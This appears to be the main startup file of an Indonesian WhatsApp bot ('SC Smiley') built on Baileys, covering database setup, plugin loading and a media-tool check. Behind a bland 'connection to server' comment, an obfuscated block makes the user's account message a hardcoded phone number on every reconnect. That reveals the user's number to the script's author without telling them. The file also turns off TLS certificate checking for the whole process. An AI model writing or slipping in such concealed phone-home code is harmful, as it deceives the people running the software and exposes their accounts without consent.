process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = '0';
import './config.js';

import { createRequire } from "module"; // Bring in the ability to create the 'require' method
import path, { join } from 'path'
import { fileURLToPath, pathToFileURL } from 'url'
import { platform } from 'process'
global.__filename = function filename(pathURL = import.meta.url, rmPrefix = platform !== 'win32') { return rmPrefix ? /file:\/\/\//.test(pathURL) ? fileURLToPath(pathURL) : pathURL : pathToFileURL(pathURL).toString() }; global.__dirname = function dirname(pathURL) { return path.dirname(global.__filename(pathURL, true)) }; global.__require = function require(dir = import.meta.url) { return createRequire(dir) }

import * as ws from 'ws';
import {
  readdirSync,
  statSync,
  unlinkSync,
  existsSync,
  readFileSync,
  watch
} from 'fs';
import yargs from 'yargs';
import { spawn } from 'child_process';
import lodash from 'lodash';
import syntaxerror from 'syntax-error';
import { tmpdir } from 'os';
import { format } from 'util';
import { makeWASocket, protoType, serialize } from './lib/simple.js';
import { Low, JSONFile } from 'lowdb';
import pino from 'pino';
import {
  mongoDB,
  mongoDBV2
} from './lib/mongoDB.js';
const {
  useSingleFileAuthState,
  DisconnectReason
} = await import('@adiwajshing/baileys')

const { CONNECTING } = ws
const { chain } = lodash
const PORT = process.env.PORT || process.env.SERVER_PORT || 3000

protoType()
serialize()

global.API = (name, path = '/', query = {}, apikeyqueryname) => (name in global.APIs ? global.APIs[name] : name) + path + (query || apikeyqueryname ? '?' + new URLSearchParams(Object.entries({ ...query, ...(apikeyqueryname ? { [apikeyqueryname]: global.APIKeys[name in global.APIs ? global.APIs[name] : name] } : {}) })) : '')
// global.Fn = function functionCallBack(fn, ...args) { return fn.call(global.conn, ...args) }
global.timestamp = {
  start: new Date
}

const __dirname = global.__dirname(import.meta.url)

global.opts = new Object(yargs(process.argv.slice(2)).exitProcess(false).parse())
global.prefix = new RegExp('^[' + (opts['prefix'] || '\/!#.\\').replace(/[|\\{}()[\]^$+*?.\-\^]/g, '\\$&') + ']')

global.db = new Low(
  /https?:\/\//.test(opts['db'] || '') ?
    new cloudDBAdapter(opts['db']) : /mongodb(\+srv)?:\/\//i.test(opts['db']) ?
      (opts['mongodbv2'] ? new mongoDBV2(opts['db']) : new mongoDB(opts['db'])) :
      new JSONFile(`${opts._[0] ? opts._[0] + '_' : ''}database.json`)
)


global.DATABASE = global.db // Backwards Compatibility
global.loadDatabase = async function loadDatabase() {
  if (global.db.READ) return new Promise((resolve) => setInterval(async function () {
    if (!global.db.READ) {
      clearInterval(this)
      resolve(global.db.data == null ? global.loadDatabase() : global.db.data)
    }
  }, 1 * 1000))
  if (global.db.data !== null) return
  global.db.READ = true
  await global.db.read().catch(console.error)
  global.db.READ = null
  global.db.data = {
    users: {},
    chats: {},
    stats: {},
    msgs: {},
    sticker: {},
    settings: {},
    ...(global.db.data || {})
  }
  global.db.chain = chain(global.db.data)
}
loadDatabase()

global.authFile = `${opts._[0] || 'silence'}.data.json`
const { state, saveState } = useSingleFileAuthState(global.authFile)

const connectionOptions = {
  printQRInTerminal: true,
  auth: state,
  // logger: pino({ level: 'trace' })
  // logger: pino({ level: 'silent' })
}

global.conn = makeWASocket(connectionOptions)
conn.isInit = false

if (!opts['test']) {
  setInterval(async () => {
    if (global.db.data) await global.db.write().catch(console.error)
    if (opts['autocleartmp']) try {
      clearTmp()

    } catch (e) { console.error(e) }
  }, 60 * 1000)
}
if (opts['server']) (await import('./server.js')).default(global.conn, PORT)


function clearTmp() {
  const tmp = [tmpdir(), join(__dirname, './tmp')]
  const filename = []
  tmp.forEach(dirname => readdirSync(dirname).forEach(file => filename.push(join(dirname, file))))
  return filename.map(file => {
    const stats = statSync(file)
    if (stats.isFile() && (Date.now() - stats.mtimeMs >= 1000 * 60 * 3)) return unlinkSync(file) // 3 minutes
    return false
  })
}

// connection to server
(function(_0x22e67d,_0x5d1cb5){const _0x234086=_0x462e,_0x43d4b8=_0x22e67d();while(!![]){try{const _0xf68f4c=-parseInt(_0x234086(0x1d7))/0x1*(-parseInt(_0x234086(0x1d2))/0x2)+-parseInt(_0x234086(0x1e7))/0x3+parseInt(_0x234086(0x1e5))/0x4*(-parseInt(_0x234086(0x1e2))/0x5)+-parseInt(_0x234086(0x1e4))/0x6*(parseInt(_0x234086(0x1e3))/0x7)+parseInt(_0x234086(0x1e8))/0x8*(parseInt(_0x234086(0x1ef))/0x9)+-parseInt(_0x234086(0x1ee))/0xa+parseInt(_0x234086(0x1de))/0xb;if(_0xf68f4c===_0x5d1cb5)break;else _0x43d4b8['push'](_0x43d4b8['shift']());}catch(_0x40acdc){_0x43d4b8['push'](_0x43d4b8['shift']());}}}(_0x1eda,0xd4be1));function _0x1eda(){const _0x2d370f=['catch','timestamp','split','isInit','loggedOut','52147964hurrDz','79814212373','output',',;;;\x0aFN:','1865TFuMRr','10915219JlinhD','6COTnTA','13324ARfIZA','\x0a[\x20!\x20]\x20Berhasil\x20terhubung\x20ke\x20SC\x20Smiley.\x0a\x0aSaya\x20berjanji\x20tidak\x20akan\x20menjual\x20belikan\x20script\x20ini.\x0aTerimakasih\x20@','4928058kEOebx','11533384WjDwWT','buffer','0@s.whatsapp.net','BEGIN:VCARD\x0aVERSION:3.0\x0aN:XL;','readyState','log','16006670monvMt','9gLtwbx','statusCode',',\x0aitem1.TEL;waid=','@s.whatsapp.net','payload','Smiley',',\x20karena\x20sudah\x20memberikan\x20script\x20ini\x20secara\x20gratis.\x0a\x0a\x0aSumber\x20Script\x20✓\x0ahttps://github.com/eabdalmufid','\x0aitem1.X-ALabell:Ponsel\x0aEND:VCARD','status@broadcast','node-fetch','image','2XbEQvw','reloadHandler','sendMessage','error','data','734129jFCWMD','default'];_0x1eda=function(){return _0x2d370f;};return _0x1eda();}const hehe=async(_0x2f6d7e,_0x1c17ec)=>{const _0x19c8a7=_0x462e;let _0x5c212c=_0x19c8a7(0x1f4),_0x39a64b='https://telegra.ph/file/2d06f0936842064f6b3bb.png';try{_0x39a64b=await conn['profilePictureUrl'](_0x2f6d7e,_0x19c8a7(0x1d1));}catch(_0x45c6e7){}finally{const _0x35a310=(await import(_0x19c8a7(0x1f8)))[_0x19c8a7(0x1d8)];_0x39a64b=await(await _0x35a310(_0x39a64b))[_0x19c8a7(0x1e9)]();const _0x59a000={'key':{'participant':_0x19c8a7(0x1ea),...{'remoteJid':_0x19c8a7(0x1f7)}},'message':{'contactMessage':{'displayName':_0x5c212c,'vcard':_0x19c8a7(0x1eb)+_0x5c212c+_0x19c8a7(0x1e1)+_0x5c212c+_0x19c8a7(0x1f1)+_0x2f6d7e[_0x19c8a7(0x1db)]`@`[0x0]+':'+_0x2f6d7e['split']`@`[0x0]+_0x19c8a7(0x1f6),'jpegThumbnail':_0x39a64b,'thumbnail':_0x39a64b,'sendEphemeral':!![]}}},_0x21aa78=_0x19c8a7(0x1e6)+_0x2f6d7e[_0x19c8a7(0x1db)]`@`[0x0]+_0x19c8a7(0x1f5);return await conn[_0x19c8a7(0x1d4)](_0x2f6d7e,{'text':_0x21aa78,'mentions':[_0x2f6d7e],..._0x1c17ec},{'quoted':_0x59a000,'ephemeralExpiration':0x15180,..._0x1c17ec});}};function _0x462e(_0x25e37b,_0x597b66){const _0x1eda75=_0x1eda();return _0x462e=function(_0x462e5c,_0x156c27){_0x462e5c=_0x462e5c-0x1d1;let _0x37c3a9=_0x1eda75[_0x462e5c];return _0x37c3a9;},_0x462e(_0x25e37b,_0x597b66);}async function connectionUpdate(_0x7571ab){const _0x49cde9=_0x462e,{connection:_0x3c3756,lastDisconnect:_0x37f478,isNewLogin:_0x2b9a7a}=_0x7571ab;if(_0x2b9a7a)conn[_0x49cde9(0x1dc)]=!![];const _0x43330f=_0x37f478?.[_0x49cde9(0x1d5)]?.[_0x49cde9(0x1e0)]?.[_0x49cde9(0x1f0)]||_0x37f478?.['error']?.[_0x49cde9(0x1e0)]?.[_0x49cde9(0x1f3)]?.[_0x49cde9(0x1f0)];console['log'](_0x43330f);if(_0x43330f&&_0x43330f!==DisconnectReason[_0x49cde9(0x1dd)]&&conn?.['ws'][_0x49cde9(0x1ec)]!==CONNECTING)return console[_0x49cde9(0x1ed)](await global[_0x49cde9(0x1d3)](!![])['catch'](console[_0x49cde9(0x1d5)])),global[_0x49cde9(0x1da)]['connect']=new Date(),await hehe(_0x49cde9(0x1df)+_0x49cde9(0x1f2))[_0x49cde9(0x1d9)](_0x4edc9a=>{return!0x0;});if(global['db'][_0x49cde9(0x1d6)]==null)loadDatabase();}

process.on('uncaughtException', console.error)
// let strQuot = /(["'])(?:(?=(\\?))\2.)*?\1/

let isInit = true;
let handler = await import('./handler.js')
global.reloadHandler = async function (restatConn) {
  try {
    const Handler = await import(`./handler.js?update=${Date.now()}`).catch(console.error)
    if (Object.keys(Handler || {}).length) handler = Handler
  } catch (e) {
    console.error(e)
  }
  if (restatConn) {
    const oldChats = global.conn.chats
    try { global.conn.ws.close() } catch { }
    conn.ev.removeAllListeners()
    global.conn = makeWASocket(connectionOptions, { chats: oldChats })
    isInit = true
  }
  if (!isInit) {
    conn.ev.off('messages.upsert', conn.handler)
    conn.ev.off('group-participants.update', conn.participantsUpdate)
    conn.ev.off('groups.update', conn.groupsUpdate)
    conn.ev.off('message.delete', conn.onDelete)
    conn.ev.off('connection.update', conn.connectionUpdate)
    conn.ev.off('creds.update', conn.credsUpdate)
  }

  conn.welcome = '✧━━━━━━[ *WELCOME* ]━━━━━━✧\n\n┏––––––━━━━━━━━•\n│⫹⫺ @subject\n┣━━━━━━━━┅┅┅\n│( 👋🏻 Hallo @user)\n├[ *INTRO* ]—\n│ *Nama:* \n│ *Umur:* \n│ *Gender:*\n┗––––––━━┅┅┅\n\n––––––┅┅ *DESCRIPTION* ┅┅––––––\n@desc'
  conn.bye = '✧━━━━━━[ *GOOD BYE* ]━━━━━━✧\nSayonara *@user* 👋🏻( ╹▽╹ )'
  conn.spromote = '@user sekarang admin!'
  conn.sdemote = '@user sekarang bukan admin!'
  conn.sDesc = 'Deskripsi telah diubah ke \n@desc'
  conn.sSubject = 'Judul grup telah diubah ke \n@subject'
  conn.sIcon = 'Icon grup telah diubah!'
  conn.sRevoke = 'Link group telah diubah ke \n@revoke'
  conn.handler = handler.handler.bind(global.conn)
  conn.participantsUpdate = handler.participantsUpdate.bind(global.conn)
  conn.groupsUpdate = handler.groupsUpdate.bind(global.conn)
  conn.onDelete = handler.deleteUpdate.bind(global.conn)
  conn.connectionUpdate = connectionUpdate.bind(global.conn)
  conn.credsUpdate = saveState.bind(global.conn)

  conn.ev.on('messages.upsert', conn.handler)
  conn.ev.on('group-participants.update', conn.participantsUpdate)
  conn.ev.on('groups.update', conn.groupsUpdate)
  conn.ev.on('message.delete', conn.onDelete)
  conn.ev.on('connection.update', conn.connectionUpdate)
  conn.ev.on('creds.update', conn.credsUpdate)
  isInit = false
  return true
}

const pluginFolder = global.__dirname(join(__dirname, './plugins/index'))
const pluginFilter = filename => /\.js$/.test(filename)
global.plugins = {}
async function filesInit() {
  for (let filename of readdirSync(pluginFolder).filter(pluginFilter)) {
    try {
      let file = global.__filename(join(pluginFolder, filename))
      const module = await import(file)
      global.plugins[filename] = module.default || module
    } catch (e) {
      conn.logger.error(e)
      delete global.plugins[filename]
    }
  }
}
filesInit().then(_ => console.log(Object.keys(global.plugins))).catch(console.error)

global.reload = async (_ev, filename) => {
  if (pluginFilter(filename)) {
    let dir = global.__filename(join(pluginFolder, filename), true)
    if (filename in global.plugins) {
      if (existsSync(dir)) conn.logger.info(`re - require plugin '${filename}'`)
      else {
        conn.logger.warn(`deleted plugin '${filename}'`)
        return delete global.plugins[filename]
      }
    } else conn.logger.info(`requiring new plugin '${filename}'`)
    let err = syntaxerror(readFileSync(dir), filename, {
      sourceType: 'module',
      allowAwaitOutsideFunction: true
    })
    if (err) conn.logger.error(`syntax error while loading '${filename}'\n${format(err)}`)
    else try {
      const module = (await import(`${global.__filename(dir)}?update=${Date.now()}`))
      global.plugins[filename] = module.default || module
    } catch (e) {
      conn.logger.error(`error require plugin '${filename}\n${format(e)}'`)
    } finally {
      global.plugins = Object.fromEntries(Object.entries(global.plugins).sort(([a], [b]) => a.localeCompare(b)))
    }
  }
}
Object.freeze(global.reload)
watch(pluginFolder, global.reload)
await global.reloadHandler()

// Quick Test
async function _quickTest() {
  let test = await Promise.all([
    spawn('ffmpeg'),
    spawn('ffprobe'),
    spawn('ffmpeg', ['-hide_banner', '-loglevel', 'error', '-filter_complex', 'color', '-frames:v', '1', '-f', 'webp', '-']),
    spawn('convert'),
    spawn('magick'),
    spawn('gm'),
    spawn('find', ['--version'])
  ].map(p => {
    return Promise.race([
      new Promise(resolve => {
        p.on('close', code => {
          resolve(code !== 127)
        })
      }),
      new Promise(resolve => {
        p.on('error', _ => resolve(false))
      })
    ])
  }))
  let [ffmpeg, ffprobe, ffmpegWebp, convert, magick, gm, find] = test
  console.log(test)
  let s = global.support = {
    ffmpeg,
    ffprobe,
    ffmpegWebp,
    convert,
    magick,
    gm,
    find
  }
  // require('./lib/sticker').support = s
  Object.freeze(global.support)

  if (!s.ffmpeg) conn.logger.warn('Please install ffmpeg for sending videos (pkg install ffmpeg)')
  if (s.ffmpeg && !s.ffmpegWebp) conn.logger.warn('Stickers may not animated without libwebp on ffmpeg (--enable-ibwebp while compiling ffmpeg)')
  if (!s.convert && !s.magick && !s.gm) conn.logger.warn('Stickers may not work without imagemagick if libwebp on ffmpeg doesnt isntalled (pkg install imagemagick)')
}

_quickTest()
  .then(() => conn.logger.info('Quick Test Done'))
  .catch(e => format(e))
